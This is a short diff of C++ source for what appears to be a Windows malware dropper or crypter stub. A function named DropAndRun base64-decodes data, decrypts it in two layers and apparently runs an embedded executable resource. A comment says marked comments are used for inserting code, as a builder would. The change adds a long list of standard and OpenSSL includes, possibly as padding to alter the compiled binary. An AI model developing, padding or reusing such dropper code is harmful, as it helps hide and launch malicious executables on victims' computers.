@@ -5,7 +5,39 @@
 #include <stdlib.h>
 #include <time.h>
 #include <wincrypt.h>
-#include <iostream>
+#include <iostream>      
+#include <fstream>       
+#include <sstream>       
+#include <string>       
+#include <vector>      
+#include <array>       
+#include <deque>        
+#include <list>        
+#include <map>        
+#include <unordered_map> 
+#include <set>           
+#include <unordered_set> 
+#include <algorithm>    
+#include <functional>  
+#include <numeric>      
+#include <utility>     
+#include <memory>       
+#include <random>        
+#include <chrono>      
+#include <cmath>       
+#include <limits>      
+#include <cstdint>     
+#include <cstddef>       
+#include <cassert>    
+#include <iomanip>      
+#include <bitset>    
+#include <cstring>    
+#include <cstdlib>     
+#include <ctime>        
+#include <thread>        
+#include <mutex>     
+#include <atomic>  
+#include <openssl/sha.h> 
 #define IDR_EXE1 101
 /*
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! dont remove comments they are used for inserting code 
@@ -81,7 +113,6 @@ void DropAndRun(HMODULE hModule) {
 
 
     //base642
-
     
     decrypt2(decodedData, decodedSize, KEY2);
     decrypt1(decodedData, decodedSize, KEY1);
